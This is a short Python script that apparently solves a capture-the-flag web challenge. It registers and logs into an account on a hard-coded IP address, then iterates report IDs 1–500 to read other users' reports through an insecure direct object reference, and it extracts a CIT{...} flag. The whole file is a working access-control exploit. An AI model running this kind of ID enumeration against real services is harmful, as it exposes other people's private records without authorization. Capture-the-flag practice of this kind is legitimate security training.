#!/usr/bin/env -S uv run
# /// script
# dependencies = [
#   "requests>=2.32.0",
# ]
# ///

import html
import re
import sys
import uuid

import requests


def fail(message: str) -> "NoReturn":
    raise SystemExit(message)


def main() -> None:
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://23.179.17.92:5001"
    base_url = base_url.rstrip("/")

    session = requests.Session()
    session.trust_env = False

    username = f"user{uuid.uuid4().hex[:10]}"
    password = "P@ssw0rd!"

    response = session.post(
        f"{base_url}/register",
        data={"username": username, "password": password},
        timeout=10,
        allow_redirects=False,
    )
    if response.status_code not in {200, 302}:
        fail(f"registration failed: {response.status_code} {response.text}")

    response = session.post(
        f"{base_url}/login",
        data={"username": username, "password": password},
        timeout=10,
        allow_redirects=False,
    )
    if response.status_code not in {200, 302}:
        fail(f"login failed: {response.status_code} {response.text}")

    candidate_ids = [347]
    candidate_ids.extend(report_id for report_id in range(1, 501) if report_id != 347)

    for report_id in candidate_ids:
        response = session.get(
            f"{base_url}/report",
            params={"id": report_id},
            timeout=10,
        )
        if response.status_code != 200:
            continue

        match = re.search(
            r'<div class="report-content">\s*(.*?)\s*</div>',
            response.text,
            re.DOTALL,
        )
        if not match:
            continue
        content = html.unescape(match.group(1).strip())
        flag = re.search(r"CIT\{[^}]+\}", content)
        if flag:
            print(flag.group(0))
            return

    fail("flag not found")


if __name__ == "__main__":
    main()
